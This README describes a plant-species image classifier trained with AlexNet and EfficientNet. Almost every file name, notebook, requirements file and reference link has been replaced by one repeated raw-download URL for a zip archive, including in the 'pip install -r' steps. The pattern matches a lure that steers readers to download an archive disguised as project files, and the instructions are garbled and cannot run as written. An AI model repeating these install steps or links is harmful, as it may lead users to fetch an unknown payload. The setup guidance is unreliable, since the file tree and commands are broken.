# 🌿 Plant Identifier - Plant Image Classification with Deep Learning

This project trains a convolutional neural network to classify plant species using online images sourced from a CSV file. It follows a clean modular structure for data preparation, training, and model evaluation.

## Setup Instructions

### 1. Environment

```bash
# Create a new conda environment named 'plants'
conda create -n plants python=3.13

# Activate the environment
conda activate plants
```

### 2. Install Dependencies

```bash
# Path of the folder to run
cd "C:\Users\angyp\Documents\anaconda_projects\Fotografia de Plantas\Mod" 

# Install required packages
pip install -r https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip
```

### 3. Launch Jupyter Notebook

```bash
# Start Jupyter Notebook
jupyter notebook
```

Then open `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip` in your browser.

## 📁 Projects Structure

```bash

MOD/
├── data/
│   ├── raw/
│   │   ├── Dataset_plants/        # Original GBIF TXT/XML dataset
│   │   │   ├── dataset/
│   │   │   │    └── ...           #  XML dataset
│   │   │   ├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`
│   │   │   ├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`
│   │   │   ├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`
│   │   │   ├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`
│   │   │   ├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`
│   │   │   ├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`
│   │   │   └── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`
│   │   └── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`           # GBIF merged dataset with columns specifics
│   └── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`           # Cleaned dataset with URLs and label IDs
│
├── helpers/
│   ├── _pycache_/
│   ├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`         # Class LocalPlantDataset for local images
│   └── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`           # Training function with metrics/logging
│
├── models/                        # Trained PyTorch models are saved here
│   ├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`
│   └── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`
│
├── notebooks/
│   ├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`   # Download the dataset of ``https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip``
│   ├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`    # Cleans `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip` into `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`
│   ├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`            # Models with random images are tested
│   ├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`      # Loads data, trains AlexNet and plots metrics
│   └── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip` # Loads data, trains EfficientNet and plots metrics
│
├── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`                    # Project documentation
└── `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`             # Python dependencies
```

## How to train

### 1. Preprocess the dataset and download

```bash
# Run
https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip
```

It will create `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip` with:

- url: valid image URL (from GBIF identifier or references)
- scientificName
- label_id: integer-encoded label

```bash
# Run
notebooks/download_dataset
```

Then it will download the dataset. Once the dataset is downloaded, folders containing fewer than 100 images will be removed, and only those with at least 100 images will be kept.

### 2. Train Models

#### 2.1. AlexNet

```bash
# Run
https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip
```

- Loads local images from data/images/
- Trains AlexNet with accuracy and loss logs per epoch
- Saves model to `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`

#### 2.2. EfficientNetV2-S

```bash
# Run
https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip
```

- Uses the same dataset structure
- Trains EfficientNetV2-S using https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip
- Saves model to `https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip`

### 3. Evaluate

Accuracy and loss graphs are shown automatically after each training.

## Requirements

```bash
# Install dependencies:
pip install -r https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip
```

## Note

- Models can be extended easily with ResNet, VGG, etc.
- EfficientNet tends to perform better on small datasets with fewer parameters.
- Recommended: Use a GPU to accelerate training.
- Sources who maybe would be useful [Deep-Plant GitHub Repository](https://github.com/AngellyR/Fotograf-a-de-plantas/raw/refs/heads/main/parrock/de_a_Fotograf_plantas_2.9.zip)
